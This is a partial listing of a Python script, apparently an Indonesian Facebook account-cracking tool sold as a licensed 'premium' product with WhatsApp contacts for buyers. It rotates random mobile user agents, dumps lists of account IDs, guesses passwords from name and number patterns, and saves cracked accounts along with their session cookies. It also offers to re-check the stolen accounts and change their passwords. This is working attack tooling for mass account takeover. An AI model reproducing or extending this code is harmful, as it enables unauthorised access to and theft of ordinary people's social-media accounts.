...
for xd in range(10000):
    ...
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Seluler Safari/537.36 UCBrowser/11.5.2.1188 (UCMini) Seluler'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
...
#----------[User Agents]----------#
    rr = random.randrange
    rc = random.choice
    satu = f"Mozilla/5.0 (Linux; Android {str(rr(5,12))}; Lenovo L38041) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/ {str(rr(73,99))}.0.{str(rr(4500,4900))}.{str(rr(75,150))} Mobile Safari/537.36"
    ...
    limabelas = f"Mozilla/5.0 (Linux; Android {str(rr(5,12))}; Redmi Note {str(rr(2,12))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/ {str(rr(75,150))}.0.{str(rr(5111,5999))}.{str(rr(73,99))} Mobile Safari/537.36"
    uaku2 = str(rc([satu,dua,tiga,empat,lima,enam,tujuh,delapan,sembilan,sepuluh,sebelas,duabelas,tigablas,empatblas,limabelas]))
    ugen.append(uaku2)

#---------------[User agent Asepitgans]---------------#
def uaAsepitgans():
        rr = random.randint
        uagg = f"Mozilla/5.0 (Linux; Android {str(rr(3,9))}.{str(rr(0,1))}.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(40,99))}.0.{str(rr(2300,2900))}.{str(rr(75,150))} Mobile Safari/537.36"
        return random.choice([uagg])
...
def menu(my_name,my_id):
	...
	print(f"[+] Author : Xsimer-XC\n[+] Status :{hh} Premium{kk}")
	prints(nel(f'{P2}Login As %s %s{P2}'%((my_id),Asepitgans_DevSu),width=80,padding=(0,7),style=f"{color_panel}")) 
...
[{color_text}03{P2}]. Crack File            [{color_text}07{P2}]. dump ID\n[{color_text}04{P2}]. Crack gmail           [{color_text}00{P2}]. Exit""",width=80,padding=(0,7),style=f"{color_panel}"))
	Asepitgans_Dev = input('[+] Pilih : ')
	if Asepitgans_Dev in ['1']:
		dump_publik()
	elif Asepitgans_Dev in ['2']:
		dump_massal()
	elif Asepitgans_Dev in ['3']:
		crack_file()
	elif Asepitgans_Dev in ['4']:
		clon_email()
	elif Asepitgans_Dev in ['5']:
		result()
	elif Asepitgans_Dev in ['6']:
		file_cp()
	elif Asepitgans_Dev in ['7']:
		Main()
	elif Asepitgans_Dev in ['0']:
...
def dump_publik():
	try:
		...
		exit()
	prints(nel(f'{K2}Ketik {P2}"{H2}Me{P2}" {K2}Jika Ingin Crack Teman Sendiri{P2}',width=80,padding=(0,7),style=f"{color_panel}")) 
...
def setting():
	...
	cetak(nel(f"Pilihan Method Bisa Menulis Kan {H2}mobile{P2}/{H2}free{P2} Atau juga {M2}1{P2}/{H2}2{P2}",width=80,padding=(0,7),style=f"{color_panel}")) 
	hc = input('[•] Pilih  : ')
	if hc in ['1','mobile']:
...
#-----------[password generator]----------#
def su():
	prints(nel(f"\t{P2}[{H2}1{P2}]. 321 + 123 + 12345 [ {K2}Kurang bagus {P2}]\n\t[{H2}2{P2}]. 123 + 12345 + 123456 [ {M2}kurang enak {P2}]\n\t[{H2}3{P2}]. 123 + 1234 + 12345 [{H2} Disarankan Ini {P2}]\n\t[{H2}4{P2}]. 123 + 12345 [{H2} Disarankan Ini {P2}]\n\t[{H2}5{P2}]. 123 + namefull [{H2} Disarankan Ini new {P2}]",width=80,style=f"{color_panel}")) 
	ch = input('[•] Pilih  : ')
	if ch in ['1','01']:
		babi()
	elif ch in ['2','02']:
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				tree = Tree(" ")
				tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]").add(f"\r[yellow]{ua}[white]")
				Buat(tree)
				...
				tree = Tree(" ")
				tree.add(f"\r[green]Nama Anda : {nmf}[white]").add(f"\r[green]{idf}|{pw}[white] ").add(f"\r[green]{kuki}[white] ")
				Buat(tree)
...
def getkey():
    ...
    try:
        ...
        none();time.sleep(1)
        print("")
        print("\033[0m╰─ Authour Asepitgans_Dev XD TOD ")
        ...
        if yt in ["Y","y"]:
            os.system("xdg-open https://wa.me/+6281322544391?text=Assalamualaikum+bang+Asepitgans_Dev,+aku+mau+beli+scriptnya+tapi+yang+versi+premium.+Ini+lisensinya:%20"+crot+"+konfitmasi+nama+pembeli:%20"+namamu)
...
def file_cp():
	dirs = os.listdir('CP')
	prints(nel(f'{P2}pilih hasil crack yg tersimpan untuk cek opsi',width=80,padding=(0,7),style=f"{color_panel}")) 
	for file in dirs:
		print("%s•> \033[0m%s"%(U,file));jeda(0.07)
	try:
...
def opsi():
	CP = ("CP/")
	romi = input("%s[+]%s \033[0mNama file %s> %s"%(U,O,M,K))
	if romi == "":
	...
	jalan("%s[+]%s\033[0m Mode pesawatkan terlebih dahulu 5 detik "%(U,O))
	pw=input("\n%s[+]%s \033[0mubah sandi pada akun one tab? y/t %s> %s"%(U,O,M,K))
	if pw in['y','Y']:
		ubah_pass.append("ubah_sandi")
		pw2 = input("%s[+]%s \033[0mmasukan sandi %s> %s"%(U,O,M,K))
		if len(pw2) <= 5:
			print("%s[+] sandi minimal 6 karakter "%(M))
		else:
			pwbaru.append(pw2)
	print("\n %s# %s---------------------------------------- %s#"%(P,M,P));jeda(2)
	print ("%s[+]%s\033[0m total akun %s: %s%s "%(U,O,M,K,str(len(file_cp))))
	...
	for fb in file_cp:
		...
		try:
			...
			continue
	print("\n%s[+]%s \033[0mSelesai mengecek akun"%(U,O));jeda(0.07)
	input('%s[+]%s [%s Enter%s ] '%(U,O,U,O))
	back()
...
if __name__=="__main__":
	...
	if tanggal >= exp:
		os.system("clear")
		print('\033[0m')
		cetak(nel(f"""[[red]•[white]] Script Kadaluarsa Silahkan Beli Scriptnya ke Authour Asepitgans-Dev \n[[red]•[white]] WhatsApp : +6289530656600"""))
		sys.exit()
	else:
		os.system('git pull')
		make()